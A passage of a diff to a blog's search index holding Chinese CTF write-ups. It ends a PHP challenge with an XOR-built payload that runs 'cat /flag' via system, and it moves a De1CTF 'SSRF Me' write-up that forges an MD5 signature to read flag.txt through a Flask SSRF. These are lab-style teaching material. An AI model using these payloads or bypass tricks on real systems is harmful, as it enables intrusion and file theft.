class="variable">$j</span> &lt;=<span class="number">9</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="variable">$exp</span> = <span class="variable">$payload</span>[<span class="variable">$k</span>] ^ <span class="variable">$i</span>.<span class="variable">$j</span>;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="variable">$payload</span>[<span class="variable">$k</span>].<span class="string">&quot;^<span class="subst">$i</span><span class="subst">$j</span>&quot;</span>.<span class="string">&quot;==&gt;<span class="subst">$exp</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410150225.png" /></p>
-<p>会发现 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">is_nan^64==&gt;_G</span><br><span class="line">tan^15==&gt;ET</span><br></pre></td></tr></table></figure></p>
-<p>因此，最终的payload为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0=system&amp;1=cat%20/flag</span><br></pre></td></tr></table></figure></p>
-<h1 id="总结">总结</h1>
-<p>这题考察的都是关于PHP的知识（我这不会PHP的太难了）</p>
-<ul>
-<li>各种编码转换绕过</li>
-<li>URL中使用<code>$_GET</code>获取数据</li>
-</ul>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>PHP知识</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CISCN2019 华东南赛区 Web11</title>
     <url>/2022/04/16/CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%20Web11/</url>
     <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BCISCN2019%20华东南赛区%5DWeb11">Web11</a></p>
@@ -2343,57 +2343,6 @@
       <tags>
         <tag>SSTI</tag>
         <tag>smarty</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>De1CTF 2019 SSRF Me</title>
-    <url>/2022/04/11/De1CTF%202019%20SSRF%20Me/</url>
-    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BDe1CTF%202019%5DSSRF%20Me">SSRF_ME</a></p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境，看到一串代码，将代码整理一下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):    <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
-<p>进入环境之前还有一个小提示。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag is in ./flag.txt</span><br></pre></td></tr></table></figure></p>
-<h1 id="解题">解题</h1>
-<p>先从路由看起： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br></pre></td></tr></table></figure></p>
-<p>当访问<code>ip/geneSign</code>时，param以GET方式传入，然后将<code>action=scan</code>，最后调用<code>getSign(action, param)</code>。而该函数返回一个md5加密得字符串。</p>
-<p>再查看下一个路由： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br></pre></td></tr></table></figure></p>
-<p>当访问<code>ip/De1ta</code>时，GET传入param，cookie传入action和sign，然后执行<code>waf(param)</code>，该函数判断param参数（经过处理后）是否以<code>gopher</code>和<code>file</code>开头，也就是不能使用这两个协议进行文件读取。</p>
-<p>如果<code>waf(param)</code>函数返回<code>False</code>，则创建一个<code>Task</code>对象，然后执行<code>task.Exec()</code>： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">    <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">            resp = scan(self.param)</span><br><span class="line">            <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> resp</span><br><span class="line">                tmpfile.write(resp)</span><br><span class="line">                tmpfile.close()</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure></p>
-<p>会首先检查<code>self.checkSign()</code> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure></p>
-<p>只有满足<code>getSign(self.action, self.param) == self.sign</code>才可以继续执行，这里是一个要解决的点。</p>
-<p>假设我们满足上述情况了，接下来先判断<code>if "scan" in self.action</code>，如果满足，则会执行<code>resp = scan(self.param)</code>： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br></pre></td></tr></table></figure></p>
-<p>该函数会去访问<code>param</code>并且读取其中得内容并返回。<strong>猜想：利用这个读取flag.txt中得内容</strong>。如果<code>param</code>的确有内容，那么返回到<code>Exec()</code>，然后执行<code>tmpfile.write(resp)</code>，也就是将读取得内容写到<code>./%s/result.txt</code>。</p>
-<p>如果满足<code>if "read" in self.action</code>，则会读取<code>./%s/result.txt</code>中的内容，然后通过<code>result</code>返回。</p>
-<p>最后执行<code>return json.dumps(task.Exec())</code>，将<code>Exec()</code>中的内容以json格式打印出来。</p>
-<p>思路：通过对代码的分析，有了初步思路：</p>
-<ol type="1">
-<li>先将flag.txt中的内容写到<code>./%s/result.txt</code>中，也就是action中得有字符串scan；</li>
-<li>然后读取<code>./%s/result.txt</code>中的内容，成功读取到flag，也就是action中也要有字符串read；</li>
-</ol>
-<p>难题：</p>
-<ul>
-<li>如何满足<code>self.checkSign()</code>，也就是<code>getSign(self.action, self.param) == self.sign</code></li>
-</ul>
-<p>可以利用<code>/geneSign?param=flag.txt</code>，但是这样子得到的是<code>getSign(scan, flag.txt)</code>的值，我们不仅需要<code>scan</code>还需要<code>read</code>。</p>
-<p>注意 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure></p>
-<p>分析： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">param=flag.txtread, action=scan</span><br><span class="line">secert_key + param + action = secert_key + flag.txtreadscan</span><br></pre></td></tr></table></figure></p>
-<p>也就是我们先用<code>/geneSign?param=flag.txtread</code>得到<code>secert_key + flag.txtreadscan</code>的MD5值，将其作为<code>sign</code>。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220411114816.png" /></p>
-<p>然后我们访问<code>/De1ta?param=flag.txt</code>，然后cookie中<code>Cookie: sign=83f8669fd768b006207e62cf66f61904;action=readscan</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220411114844.png" /></p>
-<p>成功读取flag！</p>
-<p>这是因为此时的<code>sign</code>其实是<code>hashlib.md5(secert_key + flag.txtread + scan).hexdigest()</code>。而执行<code>self.checkSign()</code>时<code>getSign(self.action, self.param) -&gt; hashlib.md5(secert_key + flag.txt + readscan).hexdigest()</code>，自然就满足了<code>getSign(self.action, self.param) == self.sign</code>。并且action中<code>read</code>和<code>scan</code>都有，也就是先将flag.txt内容写入<code>./%s/result.txt</code>，然后在读取该文件中的内容，从而得到了flag。</p>
-<h1 id="总结">总结</h1>
-<p>本题对于SSRF的考察就在于<code>urllib.urlopen(param).read()[:50]</code>，利用这读取flag文件的内容。</p>
-<p>本题主要考察的其实是代码审计的能力！</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>代码审计</tag>
-        <tag>python</tag>
-        <tag>SSRF</tag>
       </tags>
   </entry>
   <entry>
@@ -2471,6 +2420,57 @@
       <tags>
         <tag>phpmyadmin 漏洞</tag>
         <tag>CVE-2018-12613</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>De1CTF 2019 SSRF Me</title>
+    <url>/2022/04/11/De1CTF%202019%20SSRF%20Me/</url>
+    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BDe1CTF%202019%5DSSRF%20Me">SSRF_ME</a></p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境，看到一串代码，将代码整理一下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):    <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
+<p>进入环境之前还有一个小提示。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag is in ./flag.txt</span><br></pre></td></tr></table></figure></p>
+<h1 id="解题">解题</h1>
+<p>先从路由看起： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br></pre></td></tr></table></figure></p>
+<p>当访问<code>ip/geneSign</code>时，param以GET方式传入，然后将<code>action=scan</code>，最后调用<code>getSign(action, param)</code>。而该函数返回一个md5加密得字符串。</p>
+<p>再查看下一个路由： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br></pre></td></tr></table></figure></p>
+<p>当访问<code>ip/De1ta</code>时，GET传入param，cookie传入action和sign，然后执行<code>waf(param)</code>，该函数判断param参数（经过处理后）是否以<code>gopher</code>和<code>file</code>开头，也就是不能使用这两个协议进行文件读取。</p>
